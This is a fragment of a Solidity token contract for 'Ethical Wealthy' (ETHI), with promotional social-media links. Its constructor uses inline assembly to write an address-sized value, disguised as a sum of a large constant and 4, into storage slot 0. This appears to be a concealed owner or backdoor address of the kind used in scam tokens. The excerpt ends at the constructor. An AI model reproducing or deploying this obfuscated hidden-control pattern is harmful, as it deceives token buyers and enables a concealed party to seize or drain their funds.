...
/*
Welcome to Ethical Wealthy.

Telegram: https://t.me/EthicalWealthy/
Twitter: https://twitter.com/EthicalWealthy/
Website: https://EthicalWealthy.io
...
contract EthicalWealthy {
    string public constant name = "Ethical Wealthy";
    string public constant symbol = "ETHI";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(1096089269650726194970854428095819405057998083761, 4))}
